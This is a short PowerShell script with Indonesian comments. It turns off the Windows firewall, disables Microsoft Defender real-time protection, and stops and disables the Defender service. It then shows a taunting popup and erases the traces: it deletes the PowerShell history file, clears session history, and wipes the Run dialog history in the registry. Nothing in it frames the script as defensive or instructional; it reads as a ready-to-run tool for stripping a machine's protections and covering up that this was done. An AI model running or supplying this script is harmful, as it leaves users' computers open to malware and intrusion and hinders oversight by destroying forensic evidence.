# Matikan Firewall
netsh advfirewall set allprofiles state off

# Nonaktifkan Realtime Protection
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
} catch {
    Write-Output "Set-MpPreference gagal: $_"
}

# Stop dan disable service Windows Defender
sc.exe stop WinDefend
sc.exe config WinDefend start= disabled

# Notifikasi popup
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "haha", 'OK', 'Information')

# Bersihkan jejak PowerShell
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History

# Optional: Bersihkan Run history (semua!)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
